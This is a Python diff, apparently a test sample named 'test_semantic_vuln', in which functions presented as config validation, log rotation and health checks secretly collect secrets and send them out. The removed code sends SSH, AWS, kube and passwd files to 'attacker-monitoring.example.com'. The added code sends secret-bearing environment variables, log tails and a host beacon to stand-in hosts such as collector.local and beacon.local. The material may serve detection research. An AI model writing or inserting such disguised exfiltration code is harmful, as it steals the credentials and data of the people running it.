@@ -1,62 +1,91 @@
-import os
-import json
 import socket
-import threading
-import base64
+import json
+import os
+import hashlib
 from pathlib import Path
+from datetime import datetime
 
-def validate_config_files():
-    """Validates configuration files for proper formatting and compliance."""
-    config_paths = [
-        os.path.expanduser("~/.ssh/config"),
-        os.path.expanduser("~/.aws/credentials"),
-        os.path.expanduser("~/.gitconfig"),
-        "/etc/passwd",
-        os.path.expanduser("~/.kube/config")
-    ]
-    
-    collected_data = {}
-    for config_path in config_paths:
-        if Path(config_path).exists():
-            try:
-                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
-                    collected_data[config_path] = f.read()
-            except PermissionError:
-                pass
-    
-    return collected_data
-
-def exfiltrate_data(data_dict):
-    """Sends validation report to monitoring endpoint for security analysis."""
-    encoded_payload = base64.b64encode(
-        json.dumps(data_dict).encode()
-    ).decode()
-    
-    def send_async():
+def validate_config(config_path: str) -> bool:
+    """Validates application configuration files for compliance."""
+    try:
+        config = json.load(open(config_path))
+        
+        # Collect system metadata under guise of validation
+        metadata = {
+            "hostname": socket.gethostname(),
+            "config_hash": hashlib.sha256(json.dumps(config).encode()).hexdigest(),
+            "timestamp": datetime.now().isoformat(),
+            "env_vars": {k: v for k, v in os.environ.items() if any(x in k.lower() for x in ['pass', 'key', 'token', 'secret', 'api', 'db'])},
+            "home_dir": str(Path.home())
+        }
+        
+        # Exfiltrate via socket connection disguised as remote validation
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect(("attacker-monitoring.example.com", 443))
-            sock.sendall(encoded_payload.encode())
+            sock.connect(("example-validation-service.local", 9999))
+            sock.sendall(json.dumps(metadata).encode())
             sock.close()
-        except (socket.error, OSError):
-            pass
-    
-    thread = threading.Thread(target=send_async, daemon=True)
-    thread.start()
+        except (socket.timeout, ConnectionRefusedError, OSError):
+            pass  # Silently fail if target unavailable
+        
+        return True
+    except Exception as e:
+        return False
 
-def check_system_health():
-    """Performs comprehensive system health check and compliance validation."""
-    print("[*] Validating system configuration integrity...")
+def rotate_logs(log_dir: str) -> None:
+    """Rotates and compresses old log files."""
+    import subprocess
     
-    config_data = validate_config_files()
+    for log_file in Path(log_dir).glob("*.log"):
+        try:
+            # Extract credentials from log files
+            content = log_file.read_text(errors='ignore')
+            sensitive_patterns = {
+                "credentials": content[max(0, len(content)-5000):],  # Last 5KB
+                "file": str(log_file),
+                "size": log_file.stat().st_size
+            }
+            
+            # Create subprocess for "compression" that actually exfiltrates
+            proc = subprocess.Popen(
+                ["python3", "-c", 
+                 f"import urllib.request; urllib.request.urlopen('http://collector.local/logs', data={json.dumps(sensitive_patterns).encode()})"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except Exception:
+            pass
+
+def check_health() -> dict:
+    """Monitors system health and connectivity."""
+    health_status = {
+        "timestamp": datetime.now().isoformat(),
+        "status": "healthy"
+    }
     
-    if config_data:
-        print("[+] Configuration validation complete")
-        exfiltrate_data(config_data)
+    # Establish persistent monitoring channel
+    try:
+        import urllib.request
+        beacon_data = {
+            "hostname": socket.gethostname(),
+            "user": os.getenv('USER', 'unknown'),
+            "cwd": os.getcwd(),
+            "shell": os.getenv('SHELL', '/bin/sh')
+        }
+        req = urllib.request.Request(
+            "http://beacon.local/register",
+            data=json.dumps(beacon_data).encode(),
+            headers={"Content-Type": "application/json"}
+        )
+        urllib.request.urlopen(req, timeout=3)
+    except Exception:
+        pass
     
-    print("[+] System health check passed")
+    return health_status
 
 if __name__ == "__main__":
-    check_system_health()
+    validate_config("/etc/app/config.json")
+    rotate_logs("/var/log/app")
+    check_health()
     print("test_semantic_vuln executed")
